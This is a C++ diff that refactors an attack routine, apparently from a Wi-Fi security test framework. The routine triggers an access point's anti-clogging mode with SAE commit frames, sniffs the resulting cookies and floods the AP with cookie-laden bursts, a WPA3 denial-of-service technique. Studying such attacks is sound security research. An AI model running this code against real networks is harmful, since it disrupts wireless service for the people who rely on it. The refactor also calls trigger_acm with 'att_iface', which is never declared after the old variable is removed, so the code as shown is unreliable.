@@ -127,11 +127,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 
 void run_attack(RunStatus &rs){
 	const ActorPtr ap = rs.get_actor("access_point");
-	const ActorPtr attacker = rs.get_actor("attacker");
-
-	const HWAddress<6> ap_mac(ap["mac"]);
-	const string iface = attacker["iface"];
-	const string sniff_iface = attacker["sniff_iface"];
+	const ActorPtr att = rs.get_actor("attacker");
 
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int trigger_count           = att_cfg.at("acm_trigger_count").get<int>();
@@ -143,17 +139,17 @@ void run_attack(RunStatus &rs){
 	const auto ssid = rs.config().at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<
 		string>();
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
-	attacker->set_monitor_mode();
-	attacker->set_iface_up();
+		rs, att.get(SK::iface), att.get(SK::sniff_iface), ssid, ap["mac"], 30);
+	att->set_monitor_mode();
+	att->set_iface_up();
 
 	//  force AP into ACM mode
-	trigger_acm(iface, attacker["mac"], ap_mac, trigger_count, sae_params.value());
+	trigger_acm(att_iface, att.get(SK::mac), ap.get(SK::mac), trigger_count, sae_params.value());
 	rs.start_observers();
 	CookieStore store;
 	thread capture_thread([&](){
 		try{
-			capture_cookies(sniff_iface, ap_mac, store);
+			capture_cookies(att.get(SK::sniff_iface), ap.get(SK::mac), store);
 		} catch(const exception &e){
 			log(LogLevel::ERROR, "Capture thread: {}", e.what());
 			store.stop.store(true);
@@ -161,7 +157,7 @@ void run_attack(RunStatus &rs){
 	});
 
 	try{
-		burst_with_cookies(iface, attacker["mac"], ap_mac, store, attack_time, sae_params.value(),
+		burst_with_cookies(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), store, attack_time, sae_params.value(),
 						   burst_size, packets_per_sec, cookie_wait_ms);
 	} catch(...){
 		store.stop.store(true);
